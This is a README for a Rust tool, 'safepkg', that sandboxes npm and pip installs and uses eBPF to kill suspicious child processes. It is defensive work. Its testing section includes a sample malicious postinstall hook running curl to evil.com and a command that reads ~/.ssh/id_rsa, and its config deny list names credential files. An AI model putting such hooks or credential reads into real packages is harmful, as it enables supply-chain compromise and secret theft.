# SafePkg (Rust Version)

> ⚠️ **Note**: This project is **vibe coded**. Please be aware of this development style and its implications.

A high-performance, memory-safe, and unprivileged sandbox for secure package installation.

## 🛡️ Overview

`safepkg` protects your system from supply chain attacks by running `npm install`, `yarn install`, and `pip install` inside a dynamic, real-time monitored sandbox.

Unlike static analysis tools, `safepkg` uses **eBPF** to watch what happens *during* the installation. If a script tries to steal your SSH keys or connect to a suspicious IP, `safepkg` kills the process immediately.

## ✨ Features

- **Dynamic Sandboxing**: Uses Linux Namespaces (`bubblewrap`) to isolate the filesystem and network.
- **eBPF Monitoring**: Real-time tracking of every system call spawned by the package manager.
- **Zero-Day Protection**: Detects malicious behavior even if the package isn't in a database yet.
- **Memory Safe**: Built 100% in Rust for maximum security and performance.
- **Unprivileged**: Does not require root to run (uses user namespaces).

## 🚀 Installation

*Note: Requires a Linux kernel with eBPF support (5.4+ recommended) and `bubblewrap` installed.*

```bash
cargo install safepkg
```

## 📖 Usage

Instead of running your package manager directly, wrap it with `safepkg`:

```bash
safepkg npm install
```

### How it works under the hood:
1. **Isolation**: `safepkg` spawns `npm` inside a `bubblewrap` container.
2. **Restricted FS**: The container can only see your project folder. It cannot see `~/.ssh`, `~/.env`, or other sensitive system files.
3. **Restricted Network**: Traffic is limited to trusted registries (e.g., registry.npmjs.org).
4. **Active Guard**: An eBPF program (built with `Aya`) monitors for `execve` calls. If `node` tries to spawn `curl` or `bash` to an external server, the monitor triggers a kill switch.

## 🛠️ Configuration

You can define custom rules in `safepkg.toml`:

```toml
[allow_list]
domains = ["registry.npmjs.org", "github.com"]
binaries = ["node", "npm", "gcc", "make"]

[deny_list]
paths = ["/etc/shadow", "~/.ssh", "~/.aws"]
```

## 🧪 Testing & Verification

You can verify that SafePkg is working correctly using the following methods:

### 1. Logic Verification (Local/macOS)
Verify the core security engine logic even without a Linux kernel:
```bash
# Run tests from the project root
cargo test
```
This will run the **Security Scenario Test**, demonstrating how SafePkg identifies and blocks high-risk binaries like `curl` and `nc` while allowing trusted ones like `npm`.

### 2. Sandbox Verification (Linux)
Test the filesystem isolation on a Linux machine:
```bash
# This should FAIL (Access Denied)
safepkg cat ~/.ssh/id_rsa

# This should SUCCEED (Current dir is writeable)
safepkg touch verification.txt
```

### 3. eBPF Monitor Verification (Linux)
Test the real-time guard against malicious scripts:
1. Create a `package.json` with: `"postinstall": "curl http://evil.com"`
2. Run `safepkg npm install`
3. **Result**: SafePkg will detect the unauthorized `curl` execution via eBPF and terminate the process immediately.

For more details, see the [Testing Strategy](./testing_strategy.md).

## 🛠️ Project Mandates

### Testing Mandate
**Every function written for `safepkg` MUST have a corresponding unit test.**
- This is a non-negotiable rule to ensure the security and reliability of the tool.
- Unit tests should be colocated in the same file using `#[cfg(test)]` or in a sibling `tests/` directory.

### Implementation Guidelines
- **Language**: Rust
- **Sandbox**: Bubblewrap (bwrap) for Linux.
- **Monitoring**: eBPF (Aya) for Linux.
- **macOS Strategy**: The core logic is built for Linux. Local testing on macOS should use mocking or Docker.

## 📜 License

MIT
